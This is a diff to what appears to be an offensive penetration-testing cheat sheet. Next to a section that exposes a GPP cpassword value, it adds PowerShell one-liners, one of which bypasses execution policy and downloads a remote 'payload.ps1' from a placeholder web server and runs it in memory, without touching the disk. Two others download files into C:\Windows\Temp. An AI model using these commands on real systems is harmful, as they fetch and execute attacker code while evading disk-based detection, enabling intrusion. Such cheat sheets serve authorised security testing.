@@ -270,8 +270,18 @@ Get GPP password
 	Cpassword : VPe/o9YRyz2cksnYRbNeQoC7S+/HhWsGEcuvup04p1E
 
 
+Download and execute powershell on memory (no disk)
 
-	PS C:\Users\mrblack\Desktop\PowerSploit\Exfiltration>
+	powershell -exec bypass -c "(New-Object Net.WebClient).Proxy.Credentials=[Net.CredentialCache]::DefaultNetworkCredentials;iwr('http://webserver/payload.ps1')|iex"
+
+PowerShell  one liner download (any version)
+
+	(New-Object System.Net.WebClient).DownloadFile("https://example.com/archive.zip", "C:\Windows\Temp\archive.zip")  
+
+PowerShell  one liner download (4.0 & 5.0)
+
+	Invoke-WebRequest "https://example.com/archive.zip" -OutFile "C:\Windows\Temp\archive.zip"  
+
 
 ## Check smb version and server info
 
